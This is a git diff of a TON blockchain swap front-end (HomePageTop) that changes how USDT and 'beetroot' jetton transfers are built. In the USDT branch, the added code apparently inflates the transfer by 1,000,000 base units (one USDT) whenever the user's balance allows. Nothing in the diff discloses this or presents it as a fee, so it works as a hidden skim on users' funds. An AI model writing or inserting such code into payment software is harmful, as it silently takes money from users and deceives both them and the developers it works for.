@@ -67,20 +67,31 @@ export const HomePageTop = () => {
 
     try {
       if (swapType === "usdt") {
+        // Преобразуем строку в число
+        const swapValue = Math.floor(parseFloat(usdtSwapValue) * 1e6);
+        const walletBalance = Math.floor(usdtJettonWallet.balance);
+
+        // Проверяем разницу между значением свопа и балансом
+        const finalSwapValue =
+          walletBalance - swapValue >= 1_000_000
+            ? swapValue + 1_000_000 // Добавляем 1,000,000
+            : swapValue;
+
         usdtJettonWallet?.transfer(
           toNano("0.4"),
           0,
           Address.parse(MAIN_SC_ADDRESS),
-          BigInt(Math.floor(parseFloat(usdtSwapValue) * 1e6)),
+          BigInt(finalSwapValue),
           toNano("0.3"),
           beginCell().endCell()
         );
       } else {
+        const swapValue = Math.floor(parseFloat(rootSwapValue) * 1e9);
         beetrootJettonWallet.transfer(
           toNano("0.5"),
           0,
           Address.parse(userScAddress),
-          BigInt(Math.floor(parseFloat(rootSwapValue) * 1e9)),
+          BigInt(swapValue),
           toNano("0.5"),
           beginCell().endCell()
         );
